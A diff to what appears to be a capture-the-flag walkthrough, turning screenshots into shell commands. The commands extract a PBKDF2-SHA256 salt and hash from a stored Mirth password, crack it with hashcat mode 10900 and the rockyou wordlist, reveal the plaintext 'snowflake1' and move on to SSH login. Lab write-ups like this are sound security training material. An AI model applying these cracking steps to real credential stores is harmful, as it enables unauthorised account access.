@@ -189,15 +189,30 @@ Using AI to research the encrypted password, we discover that it uses the PBKDF2
 
 We can recover the plaintext value by splitting the ciphertext into a base64 salt and a base64 hash:
 
-<img src="Images/15-Hashcat-Prep.png" width="600">
+```
+echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | head -c8  | base64 -w0 > salt.txt
+echo 'u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==' | base64 -d | tail -c32 | base64 -w0 > hash.txt
+```
 
-And then running Hashcat using mode 10900:
+Next, we create the final hash:
 
-<img src="Images/16-Hashcat-Crack1.png" width="600">
+```
+echo "sha256:600000:$(cat salt.txt):$(cat hash.txt)" > mirth.hash
+```
 
-Which eventually identifies the plaintext password:
+#### Cracking hash using mode 10900:
 
-<img src="Images/16-Hashcat-Crack2.png" width="600">
+```
+hashcat -m 10900 -a 0 mirth.hash /usr/share/wordlists/rockyou.txt -w 3
+```
+
+This eventually identifies the plaintext: snowflake1.
+
+#### Output:
+
+```
+sha256:600000:u/+LBBOUnac=:YshQbDDqCAzy21EdK5OfZBJD1Ne4rXa1VgP5CzLd8Ps=:snowflake1
+```
 
 With this, we can now use SSH to log into the system as the Sedric user:
 
